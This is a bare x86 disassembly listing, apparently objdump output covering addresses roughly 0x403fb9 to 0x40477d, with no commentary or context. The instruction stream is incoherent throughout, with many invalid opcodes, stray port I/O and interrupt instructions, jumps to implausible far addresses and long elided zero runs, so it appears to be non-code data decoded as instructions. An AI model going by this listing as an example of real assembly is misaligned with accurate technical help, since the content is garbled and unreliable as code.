  403fb9:	e8 bd 17 dd fb       	call   0xfc1d577b
  403fbe:	d7                   	xlat   %ds:(%ebx)
  403fbf:	5a                   	pop    %edx
  403fc0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403fc1:	71 32                	jno    0x403ff5
  403fc3:	92                   	xchg   %eax,%edx
  403fc4:	14 fc                	adc    $0xfc,%al
	...
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	21 5c 93 eb          	and    %ebx,-0x15(%ebx,%edx,4)
  403ff4:	31 91 14 e8 29 07    	xor    %edx,0x729e814(%ecx)
  403ffa:	f1                   	int1
  403ffb:	db 3d 90 7e eb 19    	fstpt  0x19eb7e90
  404001:	07                   	pop    %es
  404002:	e1 db                	loope  0x403fdf
  404004:	4a                   	dec    %edx
  404005:	8f                   	(bad)
  404006:	6e                   	outsb  %ds:(%esi),(%dx)
  404007:	eb b5                	jmp    0x403fbe
  404009:	16                   	push   %ss
  40400a:	65 bd fc 63 e9 50    	gs mov $0x50e963fc,%ebp
  404010:	c5 7f 6a             	lds    0x6a(%edi),%edi
  404013:	c0 ea 98             	shr    $0x98,%dl
  404016:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404017:	ef                   	out    %eax,(%dx)
  404018:	3e 5b                	ds pop %ebx
  40401a:	e9 03 b3 16 3d       	jmp    0x3d56f322
  40401f:	54                   	push   %esp
  404020:	d9 06                	flds   (%esi)
  404022:	00 e1                	add    %ah,%cl
  404024:	f5                   	cmc
  404025:	39 ee                	cmp    %ebp,%esi
  404027:	e9 3d d6 c0 a1       	jmp    0xa2011669
  40402c:	26 90                	es nop
  40402e:	75 f1                	jne    0x404021
  404030:	95                   	xchg   %eax,%ebp
  404031:	95                   	xchg   %eax,%ebp
  404032:	f9                   	stc
  404033:	16                   	push   %ss
  404034:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404035:	e2 45                	loop   0x40407c
  404037:	11 95 06 fc 11 85    	adc    %edx,-0x7aee03fa(%ebp)
  40403d:	7f 00                	jg     0x40403f
  40403f:	e9 98 d0 74 df       	jmp    0xdfb510dc
  404044:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404045:	06                   	push   %es
  404046:	f8                   	clc
  404047:	99                   	cltd
  404048:	eb 5a                	jmp    0x4040a4
  40404a:	e8 58 3f 5b 00       	call   0x9b7fa7
  40404f:	70 fe                	jo     0x40404f
  404051:	86 ff                	xchg   %bh,%bh
  404053:	5c                   	pop    %esp
	...
  40407c:	00 00                	add    %al,(%eax)
  40407e:	66 83 db bd          	sbb    $0xffbd,%bx
  404082:	3d 5b ff 3c 62       	cmp    $0x623cff5b,%eax
  404087:	78 db                	js     0x404064
  404089:	c2 64 90             	ret    $0x9064
  40408c:	8b 2c 4e             	mov    (%esi,%ecx,2),%ebp
  40408f:	60                   	pusha
  404090:	c8 b6 6d 2b          	enter  $0x6db6,$0x2b
  404094:	ff 1c 42             	lcall  *(%edx,%eax,2)
  404097:	78 92                	js     0x40402b
  404099:	9f                   	lahf
  40409a:	24 90                	and    $0x90,%al
  40409c:	c9                   	leave
  40409d:	ab                   	stos   %eax,%es:(%edi)
  40409e:	31 90 54 62 11 dc    	xor    %edx,-0x23ee9dac(%eax)
  4040a4:	c4 79 fc             	les    -0x4(%ecx),%edi
  4040a7:	15 f4 e9 3d 5b       	adc    $0x5b3de9f4,%eax
  4040ac:	00 64 7e 8f          	add    %ah,-0x71(%esi,%edi,2)
  4040b0:	50                   	push   %eax
  4040b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4040b2:	8e 63 e8             	mov    -0x18(%ebx),%fs
  4040b5:	29 e6                	sub    %esp,%esi
  4040b7:	5a                   	pop    %edx
  4040b8:	00 64 fd 12          	add    %ah,0x12(%ebp,%edi,8)
  4040bc:	4d                   	dec    %ebp
  4040bd:	56                   	push   %esi
  4040be:	6e                   	outsb  %ds:(%esi),(%dx)
  4040bf:	63 e8                	arpl   %bp,%ax
  4040c1:	75 da                	jne    0x40409d
  4040c3:	8f                   	(bad)
  4040c4:	ff 00                	incl   (%eax)
  4040c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4040c7:	1b f8                	sbb    %eax,%edi
  4040c9:	83 9a 83 04 72 3b d8 	sbbl   $0xffffffd8,0x3b720483(%edx)
  4040d0:	6d                   	insl   (%dx),%es:(%edi)
  4040d1:	f8                   	clc
  4040d2:	e3 84                	jecxz  0x404058
  4040d4:	75 fc                	jne    0x4040d2
  4040d6:	2f                   	das
  4040d7:	05 ec 00 a7 90       	add    $0x90a700ec,%eax
  4040dc:	bf 74 95 84 75       	mov    $0x75849574,%edi
  4040e1:	f8                   	clc
	...
  40410a:	00 00                	add    %al,(%eax)
  40410c:	e7 2d                	out    %eax,$0x2d
  40410e:	00 e8                	add    %ch,%al
  404110:	96                   	xchg   %eax,%esi
  404111:	5a                   	pop    %edx
  404112:	00 00                	add    %al,(%eax)
  404114:	a8 d3                	test   $0xd3,%al
  404116:	f7 d0                	not    %eax
  404118:	1e                   	push   %ds
  404119:	1b f4                	sbb    %esp,%esi
  40411b:	ff 12                	call   *(%edx)
  40411d:	78 e8                	js     0x404107
  40411f:	67 6b 56 00 eb       	imul   $0xffffffeb,0x0(%bp),%edx
  404124:	71 82                	jno    0x4040a8
  404126:	75 08                	jne    0x404130
  404128:	7f 2f                	jg     0x404159
  40412a:	fb                   	sti
  40412b:	ff                   	(bad)
  40412c:	78 6d                	js     0x40419b
  40412e:	c0 c9 95             	ror    $0x95,%cl
  404131:	5a                   	pop    %edx
  404132:	00 eb                	add    %ch,%bl
  404134:	61                   	popa
  404135:	6e                   	outsb  %ds:(%esi),(%dx)
  404136:	c0 c9 a5             	ror    $0xa5,%cl
  404139:	5a                   	pop    %edx
  40413a:	00 6a 55             	add    %ch,0x55(%edx)
  40413d:	2d fc ff 22 8f       	sub    $0x8f22fffc,%eax
  404142:	e7 04                	out    %eax,$0x4
  404144:	de 84 ff c7 62 87 01 	fiadds 0x18762c7(%edi,%edi,8)
  40414b:	00 17                	add    %dl,(%edi)
  40414d:	5b                   	pop    %ebx
  40414e:	8d 45 a7             	lea    -0x59(%ebp),%eax
  404151:	27                   	daa
  404152:	ff 75 0f             	push   0xf(%ebp)
  404155:	b3 fa                	mov    $0xfa,%bl
  404157:	fb                   	sti
  404158:	88 84 83 7d 87 57 74 	mov    %al,0x7457877d(%ebx,%eax,4)
  40415f:	12 08                	adc    (%eax),%cl
  404161:	d3 3b                	sarl   %cl,(%ebx)
  404163:	45                   	inc    %ebp
  404164:	93                   	xchg   %eax,%ebx
  404165:	fe 06                	incb   (%esi)
  404167:	b8 3e 83 03 00       	mov    $0x3833e,%eax
  40416c:	3e 19 02             	sbb    %eax,%ds:(%edx)
  40416f:	2b 00                	sub    (%eax),%eax
	...
  404199:	00 fe                	add    %bh,%dh
  40419b:	29 06                	sub    %eax,(%esi)
  40419d:	2b fe                	sub    %esi,%edi
  40419f:	4b                   	dec    %ebx
  4041a0:	c6 04 3e ef          	movb   $0xef,(%esi,%edi,1)
  4041a4:	7c ec                	jl     0x404192
  4041a6:	bd 38 ec 8d 7b       	mov    $0x7b8dec38,%ebp
  4041ab:	38 54 ff 33          	cmp    %dl,0x33(%edi,%edi,8)
  4041af:	8c db                	mov    %ds,%ebx
  4041b1:	1a a3 84 03 85 7e    	sbb    0x7e850384(%ebx),%ah
  4041b7:	ec                   	in     (%dx),%al
  4041b8:	1c ff                	sbb    $0xff,%al
  4041ba:	2b 8c db ee 96 8d e8 	sub    -0x17726912(%ebx,%ebx,8),%ecx
  4041c1:	89 fb                	mov    %edi,%ebx
  4041c3:	8b e8                	mov    %eax,%ebp
  4041c5:	75 8a                	jne    0x404151
  4041c7:	5c                   	pop    %esp
  4041c8:	e5 eb                	in     $0xeb,%eax
  4041ca:	3e 84 fc             	ds test %bh,%ah
  4041cd:	bf f2 87 e8 75       	mov    $0x75e887f2,%edi
  4041d2:	42                   	inc    %edx
  4041d3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4041d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4041d5:	f8                   	clc
  4041d6:	0e                   	push   %cs
  4041d7:	9c                   	pushf
  4041d8:	2e 0b 3e             	or     %cs:(%esi),%edi
  4041db:	84 e8                	test   %ch,%al
  4041dd:	75 5a                	jne    0x404239
  4041df:	ac                   	lods   %ds:(%esi),%al
  4041e0:	d2 eb                	shr    %cl,%bl
  4041e2:	3e 84 e8             	ds test %ch,%al
  4041e5:	75 36                	jne    0x40421d
  4041e7:	9c                   	pushf
  4041e8:	d2 fa                	sar    %cl,%dl
  4041ea:	41                   	inc    %ecx
  4041eb:	b5 ba                	mov    $0xba,%ch
  4041ed:	c2 46 84             	ret    $0x8446
  4041f0:	4e                   	dec    %esi
  4041f1:	8b 22                	mov    (%edx),%esp
  4041f3:	01 bf e8 8d 99 cc    	add    %edi,-0x33667218(%edi)
  4041f9:	8d 7b d8             	lea    -0x28(%ebx),%edi
  4041fc:	53                   	push   %ebx
  4041fd:	ff 00                	incl   (%eax)
	...
  404227:	00 93 8c db ca 22    	add    %dl,0x22cadb8c(%ebx)
  40422d:	84 03                	test   %al,(%ebx)
  40422f:	85 fe                	test   %edi,%esi
  404231:	ac                   	lods   %ds:(%esi),%al
  404232:	7b b7                	jnp    0x4041eb
  404234:	3e 5b                	ds pop %ebx
  404236:	e9 03 f9 07 f1       	jmp    0xf1483b3e
  40423b:	db d4                	fcmovnbe %st(4),%st
  40423d:	92                   	xchg   %eax,%edx
  40423e:	56                   	push   %esi
  40423f:	e8 b7 17 55 e8       	call   0xe89559fb
  404244:	6b 8f 51 78 e5 5a e9 	imul   $0xffffffe9,0x5ae57851(%edi),%ecx
  40424b:	fc                   	cld
  40424c:	91                   	xchg   %eax,%ecx
  40424d:	5d                   	pop    %ebp
  40424e:	6d                   	insl   (%dx),%es:(%edi)
  40424f:	87 3e                	xchg   %edi,(%esi)
  404251:	5b                   	pop    %ebx
  404252:	e9 7a 7b 8b 26       	jmp    0x26cbbdd1
  404257:	6e                   	outsb  %ds:(%esi),(%dx)
  404258:	b2 82                	mov    $0x82,%dl
  40425a:	7b 04                	jnp    0x404260
  40425c:	3f                   	aas
  40425d:	5b                   	pop    %ebx
  40425e:	6a bf                	push   $0xffffffbf
  404260:	42                   	inc    %edx
  404261:	58                   	pop    %eax
  404262:	e9 03 0e 5b 99       	jmp    0x999b506a
  404267:	db e7                	(bad)
  404269:	5a                   	pop    %edx
  40426a:	e9 03 c7 17 05       	jmp    0x5580972
  40426f:	e8 13 87 01 68       	call   0x6841c987
  404274:	3d 5c e9 82 82       	cmp    $0x8282e95c,%eax
  404279:	56                   	push   %esi
  40427a:	e4 03                	in     $0x3,%al
  40427c:	3e 6b e9 53          	ds imul $0x53,%ecx,%ebp
  404280:	56                   	push   %esi
  404281:	ea e9 03 3e e4 2c dc 	ljmp   $0xdc2c,$0xe43e03e9
  404288:	e4 5a                	in     $0x5a,%al
  40428a:	be 71 00 00 00       	mov    $0x71,%esi
	...
  4042b3:	00 00                	add    %al,(%eax)
  4042b5:	00 62 8d             	add    %ah,-0x73(%edx)
  4042b8:	3c f0                	cmp    $0xf0,%al
  4042ba:	49                   	dec    %ecx
  4042bb:	07                   	pop    %es
  4042bc:	c1 e7 cb             	shl    $0xcb,%edi
  4042bf:	8a 91 5d 3d 5a e9    	mov    -0x16a5c2a3(%ecx),%dl
  4042c5:	82 fa 67             	cmp    $0x67,%dl
  4042c8:	60                   	pusha
  4042c9:	41                   	inc    %ecx
  4042ca:	26 8d 14 e8          	lea    %es:(%eax,%ebp,8),%edx
  4042ce:	16                   	push   %ss
  4042cf:	45                   	inc    %ebp
  4042d0:	92                   	xchg   %eax,%edx
  4042d1:	04 3e                	add    $0x3e,%al
  4042d3:	8c f4                	mov    %?,%esp
  4042d5:	fb                   	sti
  4042d6:	19 c6                	sbb    %eax,%esi
  4042d8:	00 73 21             	add    %dh,0x21(%ebx)
  4042db:	8d 6a e1             	lea    -0x1f(%edx),%ebp
  4042de:	65 54                	gs push %esp
  4042e0:	48                   	dec    %eax
  4042e1:	a8 3d                	test   $0x3d,%al
  4042e3:	8c 75 f1             	mov    %?,-0xf(%ebp)
  4042e6:	15 58 fd 56 e1       	adc    $0xe156fd58,%eax
  4042eb:	60                   	pusha
  4042ec:	d8 4e 6f             	fmuls  0x6f(%esi)
  4042ef:	87 ff                	xchg   %edi,%edi
  4042f1:	bc d5 74 e2 3d       	mov    $0x3de274d5,%esp
  4042f6:	d9 8c 23 11 e1 06 f8 	(bad)  -0x7f91eef(%ebx,%eiz,1)
  4042fd:	2e 4f                	cs dec %edi
  4042ff:	83 ff 9c             	cmp    $0xffffff9c,%edi
  404302:	b5 74                	mov    $0x74,%ch
  404304:	08 1c 99             	or     %bl,(%ecx,%ebx,4)
  404307:	8c 23                	mov    %fs,(%ebx)
  404309:	31 a1 06 ec 01 31    	xor    %esp,0x3101ec06(%ecx)
  40430f:	5b                   	pop    %ebx
  404310:	00 e9                	add    %ch,%cl
  404312:	a0 06 e8 11 89       	mov    0x8911e806,%al
  404317:	8c ff                	mov    %?,%edi
  404319:	e9 00 00 00 00       	jmp    0x40431e
	...
  404342:	00 00                	add    %al,(%eax)
  404344:	a0 06 08 01 8b       	mov    0x8b010806,%al
  404349:	92                   	xchg   %eax,%edx
  40434a:	ff e6                	jmp    *%esi
  40434c:	f4                   	hlt
  40434d:	97                   	xchg   %eax,%edi
  40434e:	5b                   	pop    %ebx
  40434f:	b0 7f                	mov    $0x7f,%al
  404351:	57                   	push   %edi
  404352:	00 3c e5 7e 83 4c 62 	add    %bh,0x624c837e(,%eiz,8)
  404359:	8c 73 f1             	mov    %?,-0xf(%ebx)
  40435c:	60                   	pusha
  40435d:	06                   	push   %es
  40435e:	08 d1                	or     %dl,%cl
  404360:	80 81 00 e9 24 9b c9 	addb   $0xc9,-0x64db1700(%ecx)
  404367:	ab                   	stos   %eax,%es:(%edi)
  404368:	41                   	inc    %ecx
  404369:	8c 54 72 11          	mov    %ss,0x11(%edx,%esi,2)
  40436d:	e0 45                	loopne 0x4043b4
  40436f:	f1                   	int1
  404370:	3e db 00             	fildl  %ds:(%eax)
  404373:	e9 3d 2b 6a 29       	jmp    0x29aa6eb5
  404378:	02 97 ea 00 27 58    	add    0x582700ea(%edi),%dl
  40437e:	c9                   	leave
  40437f:	c2 1b 58             	ret    $0x581b
  404382:	55                   	push   %ebp
  404383:	8b c3                	mov    %ebx,%eax
  404385:	1c fc                	sbb    $0xfc,%al
  404387:	8b 12                	mov    (%edx),%edx
  404389:	90                   	nop
  40438a:	8a 4d f3             	mov    -0xd(%ebp),%cl
  40438d:	78 0e                	js     0x40439d
  40438f:	51                   	push   %ecx
  404390:	26 af                	es scas %es:(%edi),%eax
  404392:	02 2b                	add    (%ebx),%ch
  404394:	17                   	pop    %ss
  404395:	89 ab 59 54 77 03    	mov    %ebp,0x3775459(%ebx)
  40439b:	f3 ad                	rep lods %ds:(%esi),%eax
  40439d:	14 c9                	adc    $0xc9,%al
  40439f:	c2 cf 57             	ret    $0x57cf
  4043a2:	55                   	push   %ebp
  4043a3:	8b 83 1e 57 8b 00    	mov    0x8b571e(%ebx),%eax
	...
  4043d1:	00 92 83 fb 8b da    	add    %dl,-0x2574047d(%edx)
  4043d7:	8f 8a 4d b7          	(bad)
  4043db:	78 02                	js     0x4043df
  4043dd:	f3 fb                	repz sti
  4043df:	14 5e                	adc    $0x5e,%al
  4043e1:	c9                   	leave
  4043e2:	55                   	push   %ebp
  4043e3:	84 ff                	test   %bh,%bh
  4043e5:	54                   	push   %esp
  4043e6:	0c a4                	or     $0xa4,%al
  4043e8:	56                   	push   %esi
  4043e9:	57                   	push   %edi
  4043ea:	0c 0b                	or     $0xb,%al
  4043ec:	08 fc                	or     %bh,%ah
  4043ee:	1c 53                	sbb    $0x53,%al
  4043f0:	10 2b                	adc    %ch,(%ebx)
  4043f2:	57                   	push   %edi
  4043f3:	11 7d 0c             	adc    %edi,0xc(%ebp)
  4043f6:	84 58 f3             	test   %bl,-0xd(%eax)
  4043f9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4043fa:	6c                   	insb   (%dx),%es:(%edi)
  4043fb:	d0 75 01             	shlb   0x1(%ebp)
  4043fe:	17                   	pop    %ss
  4043ff:	16                   	push   %ss
  404400:	5e                   	pop    %esi
  404401:	c9                   	leave
  404402:	95                   	xchg   %eax,%ebp
  404403:	92                   	xchg   %eax,%edx
  404404:	ff 54 cc b2          	call   *-0x4e(%esp,%ecx,8)
  404408:	83 c4 93             	add    $0xffffff93,%esp
  40440b:	1c 57                	sbb    $0x57,%al
  40440d:	53                   	push   %ebx
  40440e:	ff 58 01             	lcall  *0x1(%eax)
  404411:	00 57 76             	add    %dl,0x76(%edi)
  404414:	75 08                	jne    0x40441e
  404416:	cf                   	iret
  404417:	ee                   	out    %al,(%dx)
  404418:	ff                   	(bad)
  404419:	ff d0                	call   *%eax
  40441b:	04 7d                	add    $0x7d,%al
  40441d:	08 3e                	or     %bh,(%esi)
  40441f:	39 3d 2b 0c 2c 04    	cmp    %edi,0x42c0c2b
  404425:	01 3e                	add    %edi,(%esi)
  404427:	74 7b                	je     0x4044a4
  404429:	14 54                	adc    $0x54,%al
  40442b:	0a c2                	or     %dl,%al
  40442d:	e2 07                	loop   0x404436
  40442f:	fe                   	(bad)
  404430:	66 08 79 41          	data16 or %bh,0x41(%ecx)
  404434:	79 75                	jns    0x4044ab
	...
  40445e:	00 00                	add    %al,(%eax)
  404460:	4a                   	dec    %edx
  404461:	3a 3f                	cmp    (%edi),%bh
  404463:	fe                   	(bad)
  404464:	3e 6d                	ds insl (%dx),%es:(%edi)
  404466:	bb 2b 05 ff ff       	mov    $0xffff052b,%ebx
  40446b:	3a b6 bf e4 00 83    	cmp    -0x7cff1b41(%esi),%dh
  404471:	22 7a 04             	and    0x4(%edx),%bh
  404474:	0f 74 3e             	pcmpeqb (%esi),%mm7
  404477:	fe                   	(bad)
  404478:	39 0a                	cmp    %ecx,(%edx)
  40447a:	4f                   	dec    %edi
  40447b:	fe                   	(bad)
  40447c:	b4 80                	mov    $0x80,%ah
  40447e:	29 88 42 7d 79 45    	sub    %ecx,0x45797d42(%eax)
  404484:	b1 0c                	mov    $0xc,%cl
  404486:	00 3a                	add    %bh,(%edx)
  404488:	ff ac 36 10 2c 76 18 	ljmp   *0x18762c10(%esi,%esi,1)
  40448f:	c9                   	leave
  404490:	98                   	cwtl
  404491:	35 6f d5 f5 e8       	xor    $0xe8f5d56f,%eax
  404496:	45                   	inc    %ebp
  404497:	c9                   	leave
  404498:	7c 80                	jl     0x40441a
  40449a:	03 55 b5             	add    -0x4b(%ebp),%edx
  40449d:	88 80 c4 76 45 4e    	mov    %al,0x4e4576c4(%eax)
  4044a3:	57                   	push   %edi
  4044a4:	71 2f                	jno    0x4044d5
  4044a6:	fc                   	cld
  4044a7:	5a                   	pop    %edx
  4044a8:	b4 75                	mov    $0x75,%ah
  4044aa:	7b 45                	jnp    0x4044f1
  4044ac:	63 fe                	arpl   %di,%si
  4044ae:	3f                   	aas
  4044af:	01 c6                	add    %eax,%esi
  4044b1:	37                   	aaa
  4044b2:	e8 8b 55 41 3d       	call   0x3d819a42
  4044b7:	8b d3                	mov    %ebx,%edx
  4044b9:	7f bc                	jg     0x404477
  4044bb:	45                   	inc    %ebp
  4044bc:	46                   	inc    %esi
  4044bd:	74 03                	je     0x4044c2
  4044bf:	00 3e                	add    %bh,(%esi)
  4044c1:	5b                   	pop    %ebx
  4044c2:	72 36                	jb     0x4044fa
	...
  4044ec:	00 00                	add    %al,(%eax)
  4044ee:	4e                   	dec    %esi
  4044ef:	7e 29                	jle    0x40451a
  4044f1:	e6 83                	out    %al,$0x83
  4044f3:	88 e6                	mov    %ah,%dh
  4044f5:	ad                   	lods   %ds:(%esi),%eax
  4044f6:	7b 88                	jnp    0x404480
  4044f8:	de ad 32 43 71 4e    	fisubrs 0x4e714332(%ebp)
  4044fe:	11 5b 14             	adc    %ebx,0x14(%ebx)
  404501:	e8 39 d1 2c e8       	call   0xe86d163f
  404506:	b4 6e                	mov    $0x6e,%ah
  404508:	b1 7b                	mov    $0x7b,%cl
  40450a:	93                   	xchg   %eax,%ebx
  40450b:	89 f6                	mov    %esi,%esi
  40450d:	ad                   	lods   %ds:(%esi),%eax
  40450e:	7b 88                	jnp    0x404498
  404510:	71 0f                	jno    0x404521
  404512:	26 5a                	es pop %edx
  404514:	9f                   	lahf
  404515:	3e e2 d4             	loop,pt 0x4044ec
  404518:	b4 e4                	mov    $0xe4,%ah
  40451a:	c6                   	(bad)
  40451b:	6e                   	outsb  %ds:(%esi),(%dx)
  40451c:	01 7a 6b             	add    %edi,0x6b(%edx)
  40451f:	8a eb                	mov    %bl,%ch
  404521:	4e                   	dec    %esi
  404522:	c8 d4 dd 29          	enter  $0xddd4,$0x29
  404526:	b5 1f                	mov    $0x1f,%ch
  404528:	31 33                	xor    %esi,(%ebx)
  40452a:	52                   	push   %edx
  40452b:	4b                   	dec    %ebx
  40452c:	26 3e b6 7c          	es ds mov $0x7c,%dh
  404530:	29 79 03             	sub    %edi,0x3(%ecx)
  404533:	88 61 00             	mov    %ah,0x0(%ecx)
  404536:	b4 1f                	mov    $0x1f,%ah
  404538:	0d 7b fd 5b a6       	or     $0xa65bfd7b,%eax
  40453d:	45                   	inc    %ebp
  40453e:	f5                   	cmc
  40453f:	93                   	xchg   %eax,%ebx
  404540:	2b f7                	sub    %edi,%esi
  404542:	89 2e                	mov    %ebp,(%esi)
  404544:	62                   	(bad)
  404545:	d7                   	xlat   %ds:(%ebx)
  404546:	bf 9e fd e4 79       	mov    $0x79e4fd9e,%edi
  40454b:	89 3a                	mov    %edi,(%edx)
  40454d:	2f                   	das
  40454e:	95                   	xchg   %eax,%ebp
  40454f:	d7                   	xlat   %ds:(%ebx)
  404550:	24 e0                	and    $0xe0,%al
	...
  40457a:	00 00                	add    %al,(%eax)
  40457c:	0e                   	push   %cs
  40457d:	8a 5c 0c 56          	mov    0x56(%esp,%ecx,1),%bl
  404581:	0f c3 04 3e          	movnti %eax,(%esi,%edi,1)
  404585:	e0 a9                	loopne 0x404530
  404587:	13 c6                	adc    %esi,%eax
  404589:	f0 e9 03 3e 8a 00    	lock jmp 0xca8392
  40458f:	3c 32                	cmp    $0x32,%al
  404591:	73 45                	jae    0x4045d8
  404593:	b7 1d                	mov    $0x1d,%bh
  404595:	89 89 2c 16 89 75    	mov    %ecx,0x7589162c(%ecx)
  40459b:	9d                   	popf
  40459c:	1a 46 e9             	sbb    -0x17(%esi),%al
  40459f:	e9 3d 54 c0 15       	jmp    0x160099e1
  4045a4:	9d                   	popf
  4045a5:	d2 45 79             	rolb   %cl,0x79(%ebp)
  4045a8:	1d 0f f4 91 94       	sbb    $0x9491f40f,%eax
  4045ad:	89 ff                	mov    %edi,%edi
  4045af:	76 b3                	jbe    0x404564
  4045b1:	1e                   	push   %ds
  4045b2:	f8                   	clc
  4045b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4045b4:	97                   	xchg   %eax,%edi
  4045b5:	8f                   	(bad)
  4045b6:	ff                   	(bad)
  4045b7:	dc 15 89 75 59 da    	fcoml  0xda597589
  4045bd:	d7                   	xlat   %ds:(%ebx)
  4045be:	fe                   	(bad)
  4045bf:	56                   	push   %esi
  4045c0:	dd 88 75 4d ea 63    	fisttpll 0x63ea4d75(%eax)
  4045c6:	e9 e9 3d 88 75       	jmp    0x75c883b4
  4045cb:	ed                   	in     (%dx),%eax
  4045cc:	d5 5f                	aad    $0x5f
  4045ce:	e9 e9 3d 2b ff       	jmp    0xff6b83bc
  4045d3:	b4 49                	mov    $0x49,%ah
  4045d5:	d6                   	(bad)
  4045d6:	85 17                	test   %edx,(%edi)
  4045d8:	9c                   	pushf
  4045d9:	88 ff                	mov    %bh,%bh
  4045db:	b9 95 be fe 16       	mov    $0x16febe95,%ecx
	...
  404608:	00 00                	add    %al,(%eax)
  40460a:	9d                   	popf
  40460b:	88 75 15             	mov    %dh,0x15(%ebp)
  40460e:	9d                   	popf
  40460f:	0e                   	push   %cs
  404610:	f8                   	clc
  404611:	74 c7                	je     0x4045da
  404613:	79 fe                	jns    0x404613
  404615:	fe                   	(bad)
  404616:	9c                   	pushf
  404617:	2b e8                	sub    %eax,%ebp
  404619:	f7 9f 88 ff ee 16    	negl   0x16eeff88(%edi)
  40461f:	53                   	push   %ebx
  404620:	e8 54 92 88 ff       	call   0xffc8d879
  404625:	53                   	push   %ebx
  404626:	3a f3                	cmp    %bl,%dh
  404628:	11 21                	adc    %esp,(%ecx)
  40462a:	fb                   	sti
  40462b:	5a                   	pop    %edx
  40462c:	ff 54 4a 73          	call   *0x73(%edx,%ecx,2)
  404630:	bb 00 7d 7d ff       	mov    $0xff7d7d00,%ebx
  404635:	0b 9f 7d 75 f4 88    	or     -0x770b8a83(%edi),%ebx
  40463b:	23 f8                	and    %eax,%edi
  40463d:	ff 72 57             	push   0x57(%edx)
  404640:	e8 ab dd 7c ff       	call   0xffbd23f0
  404645:	23 ff                	and    %edi,%edi
  404647:	7c 75                	jl     0x4046be
  404649:	f8                   	clc
  40464a:	bf c8 fd ff c8       	mov    $0xc8fffdc8,%edi
  40464f:	7c 75                	jl     0x4046c6
  404651:	08 af ba f7 ff 88    	or     %ch,-0x77000846(%edi)
  404657:	d9 c3                	fld    %st(3)
  404659:	5b                   	pop    %ebx
  40465a:	de 9d 08 00 52 d8    	ficomps -0x27adfff8(%ebp)
  404660:	ec                   	in     (%dx),%al
  404661:	83 23 b0             	andl   $0xffffffb0,(%ebx)
  404664:	57                   	push   %edi
  404665:	8b a2 8f 0a c0 03    	mov    0x3c00a8f(%edx),%esp
  40466b:	52                   	push   %edx
  40466c:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
	...
  404696:	00 00                	add    %al,(%eax)
  404698:	e7 5b                	out    %eax,$0x5b
  40469a:	00 00                	add    %al,(%eax)
  40469c:	2c 7c                	sub    $0x7c,%al
  40469e:	83 7d df 5e          	cmpl   $0x5e,-0x21(%ebp)
  4046a2:	75 07                	jne    0x4046ab
  4046a4:	4d                   	dec    %ebp
  4046a5:	5c                   	pop    %esp
  4046a6:	02 00                	add    (%eax),%al
  4046a8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4046a9:	78 0f                	js     0x4046ba
  4046ab:	83 da 83             	sbb    $0xffffff83,%edx
  4046ae:	01 75 a0             	add    %esi,-0x60(%ebp)
  4046b1:	e5 00                	in     $0x0,%eax
  4046b3:	01 97 5b eb 02 7c    	add    %edx,0x7c02eb5b(%edi)
  4046b9:	cd 81                	int    $0x81
  4046bb:	ca 9e 5b             	lret   $0x5b9e
  4046be:	02 00                	add    (%eax),%al
  4046c0:	1a 13                	sbb    (%ebx),%dl
  4046c2:	fc                   	cld
  4046c3:	50                   	push   %eax
  4046c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4046c5:	f5                   	cmc
  4046c6:	ff                   	(bad)
  4046c7:	fe                   	(bad)
  4046c8:	f2 57                	repnz push %edi
  4046ca:	ff 75 6f             	push   0x6f(%ebp)
  4046cd:	73 a2                	jae    0x404671
  4046cf:	e9 57 5b 0b c0       	jmp    0xc04ba22b
  4046d4:	3e 27                	ds daa
  4046d6:	71 8d                	jno    0x404665
  4046d8:	03 aa 34 6a 3e 0f    	add    0xf3e6a34(%edx),%ebp
  4046de:	47                   	inc    %edi
  4046df:	f4                   	hlt
  4046e0:	ee                   	out    %al,(%dx)
  4046e1:	2b 04 ff             	sub    (%edi,%edi,8),%eax
  4046e4:	cb                   	lret
  4046e5:	a1 e0 75 3a 9d       	mov    0x9d3a75e0,%eax
  4046ea:	8f e9 3e 74          	(bad)
  4046ee:	0c c0                	or     $0xc0,%al
  4046f0:	b3 38                	mov    $0x38,%bl
  4046f2:	85 7d 26             	test   %edi,0x26(%ebp)
  4046f5:	75 57                	jne    0x40474e
  4046f7:	46                   	inc    %esi
  4046f8:	bd 57 d8 01 00       	mov    $0x1d857,%ebp
	...
  404725:	00 8b 76 84 7d 06    	add    %cl,0x67d8476(%ebx)
  40472b:	74 57                	je     0x404784
  40472d:	3a b5 37 dc 40 8e    	cmp    -0x71bf23c9(%ebp),%dh
  404733:	dc 42 fd             	faddl  -0x3(%edx)
  404736:	f1                   	int1
  404737:	fd                   	std
  404738:	8c f8                	mov    %?,%eax
  40473a:	bb bf db 50 89       	mov    $0x8950dbbf,%ebx
  40473f:	9a 03 6a 3e 15 57 10 	lcall  $0x1057,$0x153e6a03
  404746:	d1 c7                	rol    %edi
  404748:	df e8                	fucomip %st(0),%st
  40474a:	71 2b                	jno    0x404777
  40474c:	04 00                	add    $0x0,%al
  40474e:	35 34 58 0a 11       	xor    $0x110a5834,%eax
  404753:	1c 29                	sbb    $0x29,%al
  404755:	fd                   	std
  404756:	b1 3d                	mov    $0x3d,%cl
  404758:	2d ff 95 78 8c       	sub    $0x8c7895ff,%eax
  40475d:	45                   	inc    %ebp
  40475e:	4a                   	dec    %edx
  40475f:	79 c3                	jns    0x404724
  404761:	74 43                	je     0x4047a6
  404763:	55                   	push   %ebp
  404764:	57                   	push   %edi
  404765:	f8                   	clc
  404766:	c1 74 e0 75 8a       	shll   $0x8a,0x75(%eax,%eiz,8)
  40476b:	6c                   	insb   (%dx),%es:(%edi)
  40476c:	1d e9 3e 74 8c       	sbb    $0x8c743ee9,%eax
  404771:	c7 45 34 57 1c bd 5b 	movl   $0x5bbd1c57,0x34(%ebp)
  404778:	64 fc                	fs cld
  40477a:	3f                   	aas
  40477b:	0a f7                	or     %bh,%dh
  40477d:	8c fb                	mov    %?,%ebx
